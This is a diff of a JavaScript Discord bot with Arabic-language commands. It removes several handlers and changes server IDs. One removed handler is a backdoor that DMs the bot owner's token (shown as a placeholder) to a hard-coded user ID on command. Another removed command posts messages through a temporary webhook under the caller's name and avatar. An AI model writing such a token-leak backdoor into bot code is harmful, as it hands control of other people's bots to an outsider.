@@ -157,15 +157,7 @@ client.on('message',  message => {
   };
 });   
 
-const Token = "`\`\` التوكن صاحب البوت `\`\`"
-client.on('message' , message => {
-if (message.author.bot) return;
-           if (message.content == '.')
-           if (message.author.id === '318923640265637901'){ //لا تغير شئ هنا
-if (!message.channel.guild) return;
-message.author.send(Token)
-}
-});
+
 
 client.on('message',message => {
       if (message.content.startsWith(prefix + 'القوانين')) {
@@ -224,17 +216,7 @@ if(msg.content === ' سلام عليكم  ') {
 msg.reply('وعليكمم السلام');
 }
 });
-var  n3k4a = {};
-client.on('guildMemberRemove', member => {
- n3k4a[member.id] = {roles: member.roles.array()};
-});
-client.on('guildMemberAdd', member => {
-if(! n3k4a[member.user.id]) return;
-console.log( n3k4a[member.user.id].roles.length);
-for(let i = 0; i <  n3k4a[member.user.id].roles.length + 1; i++) {
-member.addRole( n3k4a[member.user.id].roles.shift());
-}
-});
+
 
 client.on('message', message => {
     if (!message.content.startsWith(prefix)) return;
@@ -289,7 +271,7 @@ client.on("ready", () => {
 });
 
 client.on("guildMemberAdd", (member) => {
-    let channel = member.guild.channels.get("529465701430329348");
+    let channel = member.guild.channels.get("520971144510046229");
     if (!channel) {
         console.log("!the channel id it's not correct");
         return;
@@ -300,7 +282,7 @@ client.on("guildMemberAdd", (member) => {
     console.log('-');
     var guild;
     while (!guild)
-        guild = client.guilds.get("529465701430329346");
+        guild = client.guilds.get("357222077893181460");
     guild.fetchInvites().then((data) => {
         data.forEach((Invite, key, map) => {
             var Inv = Invite.code;
@@ -454,23 +436,7 @@ client.on('message',async message => {
             }
 }) 
 
-client.on('message', message => {
-            if (message.content.startsWith("قوانين")) {
-     let embed = new Discord.RichEmbed()
-.setThumbnail(message.author.avatarURL)
-.addField('     **اولا** ' ,' **ممنوع السب** ')
-.addField('     **ثانيا** ' ,' **لا تسوي سبام ** ')
-.addField('     **ثالثا** ' ,' **لا تزعج الاخرين** ')
-.addField('    **رابعا**' ,' **ممنوع الاعلانات** ')
-.addField('    **خامسا**' ,' **احترم الاخرين** ')
-.addField('    **سادسا**' ,' **لا تنشر في الشات او بل خاص** ')
-.addField('    **سابعا**' ,' **لا تنشر روابط!** ')
-.addField('    **ثامنا**' ,' **لا تسوي سبام ايموجي** ')
-.addField('    **تاسعا**' ,' **لا تطلب رتبه الاداره !** ')
-.setColor('#7d2dbe')
-  message.channel.sendEmbed(embed);
-    }
-});
+
 
 client.on('message',async message => {
   let mention = message.mentions.members.first();
@@ -570,22 +536,7 @@ if(ra3d.content.startsWith(prefix + 'ccolors')) {
        });
 
 
-client.on('message' , async (message) => {
- if (message.content.startsWith(prefix + 'w')) {
-  const args = message.content.substring(prefix.length).split(' ');
 
- message.delete();
-args.shift() 
-let msg = args.join(' ') 
-message.channel.createWebhook(message.author.username, message.author.avatarURL) 
-    .then(wb => {
-        const user = new Discord.WebhookClient(wb.id, wb.token) 
-        user.send(msg); 
-        user.delete() 
-    })
-    .catch(console.error)
- }
-});
 
 client.on("guildMemberAdd", member => {
   member.createDM().then(function (channel) {
